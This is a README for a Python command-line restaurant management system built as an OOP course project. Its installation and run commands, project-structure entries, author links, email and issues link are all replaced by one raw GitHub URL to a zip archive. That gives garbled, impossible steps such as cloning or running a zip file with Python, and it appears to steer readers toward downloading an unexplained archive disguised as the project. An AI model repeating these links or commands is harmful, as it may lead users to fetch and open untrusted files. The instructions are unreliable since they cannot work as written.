# 🍽️ Restaurant Management System

A comprehensive command-line restaurant management system built with Python, implementing Object-Oriented Programming (OOP) principles including abstraction, inheritance, and encapsulation.

## ✨ Features

### Admin Features
- 🔐 Secure login with username and password
- 📊 View total sales and revenue
- ➕ Add new items to the menu
- ❌ Delete items from the menu
- 📋 Display current order menu

### Customer Features
- 🛒 Place orders from the available menu
- 👀 View ordered items
- 🗑️ Delete items from current order
- 💰 Display final bill with total amount

## 🛠️ Technologies

- **Language:** Python 3.x
- **Paradigm:** Object-Oriented Programming (OOP)
- **Concepts:** Abstraction, Inheritance, Encapsulation, Polymorphism

## 📥 Installation

1. **Clone the repository**
   ```bash
   git clone https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip
   ```

2. **Navigate to the project directory**
   ```bash
   cd Restaurant-Management-System-in-Python
   ```

3. **Ensure Python is installed**
   ```bash
   python --version
   ```
   *Requires Python 3.6 or higher*

4. **Run the application**
   ```bash
   python https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip
   ```

## 🚀 Usage

### Running the Program

```bash
python https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip
```

### Main Menu Options

1. **Admin Section** - Access administrative features
2. **Customer Section** - Place and manage orders
3. **Exit** - Close the application

### Admin Login Credentials

- **Username:** `admin`
- **Password:** `1234`

*Note: For production use, implement secure password hashing and storage.*

## 📁 Project Structure

```
Restaurant-Management-System-in-Python/
├── https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip    # Main application file
└── https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip                          # Project documentation
```

### Class Structure

- **`MenuItem`** - Represents individual menu items
- **`AbstractMenu`** - Abstract base class defining menu operations
- **`Menu`** - Implements menu management functionality
- **`TotalSales`** - Extends Menu to calculate and display sales
- **`RestaurantManagementSystem`** - Main class orchestrating the application

## 🎓 OOP Concepts

### 1. Abstraction
The `AbstractMenu` class uses Python's `ABC` module to define abstract methods that must be implemented by subclasses:
```python
@abstractmethod
def add_item(self, data, foodname, price):
    pass
```

### 2. Inheritance
`TotalSales` inherits from `Menu`, extending functionality:
```python
class TotalSales(Menu):
    def calculate_total_sale(self):
        # Implementation
```

### 3. Encapsulation
Private attributes are used to protect sensitive data:
```python
self.__pass = "1234"  # Private password attribute
```

### 4. Polymorphism
Method overriding in the `TotalSales` class:
```python
def display(self):
    super().display()  # Calls parent method
    # Additional functionality
```

## 🔑 Admin Section

### Available Operations

1. **View Total Sales**
   - Displays all sold items with quantities
   - Shows total revenue generated

2. **Add New Items**
   - Enter serial number, name, and price
   - Validates for duplicate entries

3. **Delete Items**
   - Remove items by serial number
   - Displays updated menu

4. **Display Order Menu**
   - Shows all available menu items

## 🛍️ Customer Section

### Customer Operations

1. **Place Order**
   - Select items from the menu
   - Specify quantity
   - Automatic price calculation

2. **View Ordered Items**
   - Lists all items in current order
   - Shows quantities and prices

3. **Delete from Order**
   - Remove items before finalizing
   - Updates order total

4. **Display Final Bill**
   - Shows itemized bill
   - Calculates total amount

## 📸 Screenshots

```
**************************************************************************
                WELCOME TO RESTAURANT MANAGEMENT SYSTEM
**************************************************************************

                        1. ADMIN SECTION
                        2. CUSTOMER SECTION
                        3. Exit
```

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

1. **Fork the repository**
2. **Create a feature branch**
   ```bash
   git checkout -b feature/AmazingFeature
   ```
3. **Commit your changes**
   ```bash
   git commit -m 'Add some AmazingFeature'
   ```
4. **Push to the branch**
   ```bash
   git push origin feature/AmazingFeature
   ```
5. **Open a Pull Request**

### Potential Improvements

- 🔐 Implement secure authentication with hashing
- 💾 Add database integration (SQLite/PostgreSQL)
- 🖥️ Create GUI using Tkinter or PyQt
- 📊 Generate sales reports and analytics
- 🧾 Add receipt printing functionality
- 💳 Implement payment processing
- 👥 Support multiple user roles
- 🌐 Add web interface using Flask/Django

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 👨‍💻 Author

**Your Name**
- GitHub: [@iftekharul01](https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip)
- Email: https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip

## 🙏 Acknowledgments

- Built as part of CSE222 (Object-Oriented Programming 2) course project
- Thanks to all contributors and reviewers

## 📞 Support

If you encounter any issues or have questions:
- Open an [issue](https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip)
- Contact via email

---

⭐ **Star this repository if you find it helpful!** ⭐